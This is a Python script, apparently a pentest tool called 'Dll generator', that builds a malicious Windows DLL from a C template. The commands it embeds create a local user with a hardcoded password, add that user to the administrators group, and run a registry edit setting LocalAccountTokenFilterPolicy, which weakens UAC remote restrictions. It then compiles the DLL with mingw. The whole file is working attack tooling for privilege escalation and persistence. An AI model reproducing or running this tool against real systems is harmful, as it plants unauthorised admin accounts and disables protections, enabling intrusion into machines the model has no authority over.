import os
import sys
import argparse
import tempfile

version = "1.0"
author = "shoxxdj"
template="./template.c"
target_string="REPLACE_ME_HERE"

uac_unset="REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"

parser = argparse.ArgumentParser(exit_on_error=False,description=f"""
______ _ _                                   _             
|  _  | | |                                 | |            
| | | | | |   __ _  ___ _ __   ___ _ __ __ _| |_ ___  _ __ 
| | | | | |  / _` |/ _ | '_ \ / _ | '__/ _` | __/ _ \| '__|
| |/ /| | | | (_| |  __| | | |  __| | | (_| | || (_) | |   
|___/ |_|_|  \__, |\___|_| |_|\___|_|  \__,_|\__\___/|_|   
              __/ |                                        
             |___/                                         
        Version : {version}
        Author : {author}""",
        formatter_class=argparse.RawTextHelpFormatter)

parser.add_argument('--action',nargs='+',choices=['create_user','add_to_group','unset_uac'],help="Main action")
parser.add_argument('--username','-u',default="hoppy",help="Your username")
parser.add_argument('--password','-p',default='H0pBreWedW1thl0v3',help="Your password matching the rules")
parser.add_argument('--group','-g',default='administrators',help="The group, tips for FR it's Administrateur")
parser.add_argument('--wrapper','-w',default='system("cmd.exe /c INJECT_HERE");',help="A command wrapper")
parser.add_argument('--compiler','-c',default='x86_64-w64-mingw32-gcc',help="A C compiler : 'i686-w64-mingw32-gcc -lnetapi32' is an option")
parser.add_argument('--output','-o',default='hoppy.dll', help='path and name of your dll')
parser.add_argument('--debug',action='store_true',default=False,help='print a lot of useless things')

args=parser.parse_args(args=None if sys.argv[1:] else ['--help'])

if(args.wrapper and "INJECT_HERE" not in args.wrapper):
    sys.exit(-1)

to_exec=""

for action in args.action:
    if(action=='create_user'):
        username=args.username
        password=args.password
        wrapper=args.wrapper
        adduser="net user %s %s /add"%(username,password)
        cmd=wrapper.replace('INJECT_HERE',adduser)
    if(action=='add_to_group'):
        username=args.username
        group=args.group
        addtogroup="net localgroup %s %s /add"%(group,username)
        cmd=wrapper.replace('INJECT_HERE',addtogroup)
    if(action=='unset_uac'):
        cmd=wrapper.replace('INJECT_HERE',uac_unset)
    if(args.debug):
        print(cmd)
    to_exec+=cmd
    to_exec+="\r\n"

with open(template) as f:
    template_content = f.read()
    payload=template_content.replace(target_string,to_exec)
    temp_source = tempfile.NamedTemporaryFile(delete=False,suffix = '.c')
    output = args.output
    if(args.debug):
        print(payload)
    f = open(temp_source.name, "a")
    f.write(payload)
    f.close()
    compiltation_string="%s %s -shared -o %s"%(args.compiler,temp_source.name,output)
    if(args.debug):
        print(compiltation_string)
    os.system(compiltation_string)
    print("Your DLL is alive : "+output)